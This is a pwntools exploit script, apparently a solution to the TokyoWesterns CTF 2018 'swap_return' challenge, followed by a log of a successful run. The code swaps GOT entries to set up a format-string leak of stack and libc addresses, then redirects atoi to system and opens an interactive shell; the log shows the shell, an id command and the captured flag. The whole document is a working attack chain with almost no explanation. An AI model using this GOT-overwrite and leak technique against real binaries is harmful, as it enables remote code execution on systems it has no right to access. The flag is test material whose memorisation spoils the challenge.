from pwn import *

# r = process('./swap_return',env={"LD_PRELOAD": "./libc.so.6.swap"})
r = remote('swap.chal.ctf.westerns.tokyo',37567)
b = ELF('./swap_return')
e = ELF('libc.so.6.swap')

def setAddr(a1, a2):
	info('[ %x <> %x ] swap'%(a1,a2))
	r.recvuntil('Your choice:')
	r.sendline('1')
	r.recvuntil('address:')
	r.sendline(str(a1))
	r.recvuntil('address:')
	r.sendline(str(a2))

def swap():
	r.recvuntil('Your choice:')
	r.sendline('2')

def _exit():
	r.recvuntil('Your choice:')
	r.sendline('3')

setAddr(0x601058,b.got['printf'])
swap()
setAddr(0x601058,b.got['atoi'])
swap()

r.recvuntil('Your choice:')
r.sendline('%p1')
leak = r.recvuntil('Your choice:').split('0x')[1].split('Invalid choice.')[0]
leak = int(leak,16)

success('stack leak : %s'%(hex(leak)))

setAddr(b.got['_exit'],leak+0x6a+0x8)
swap()

setAddr(b.got['setvbuf'],0x601058)
swap()
_exit()

setAddr(b.symbols['stderr'],leak+0x32)
swap()
_exit()

LibcLeak = u64(r.recvuntil('1. Set').split('1. Set')[0][-6:]+'\x00\x00')
success('Libc Leak : %s'%(hex(LibcLeak)))
LibcBase = LibcLeak-e.symbols['setvbuf']
LibcSystem = LibcBase+e.symbols['system']

setAddr(LibcSystem,0x1010)
_exit()

setAddr(leak-0x56,b.got['atoi'])
swap()
r.recvuntil('Your choice:')
r.sendline('sh')
r.interactive('$ ')

'''
[+] Opening connection to swap.chal.ctf.westerns.tokyo on port 37567: Done
[*] '/media/psf/Home/writeup/ctf/twctf/2018/swap_return'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/media/psf/Home/writeup/ctf/twctf/2018/libc.so.6.swap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] [ 601058 <> 601038 ] swap
[*] [ 601058 <> 601050 ] swap
[+] stack leak : 0x7ffd11a98776
[*] [ 601018 <> 7ffd11a987e8 ] swap
[*] [ 601048 <> 601058 ] swap
[*] [ 6010a0 <> 7ffd11a987a8 ] swap
[+] Libc Leak : 0x7fa5787dc230
[*] [ 7fa5787b06a0 <> 1010 ] swap
[*] [ 7ffd11a98720 <> 601050 ] swap
[*] Switching to interactive mode

$ id
uid=37567327 gid=37567(p37567) groups=37567(p37567)
$ cat flag
TWCTF{unlimited_SWAP_Works}
'''
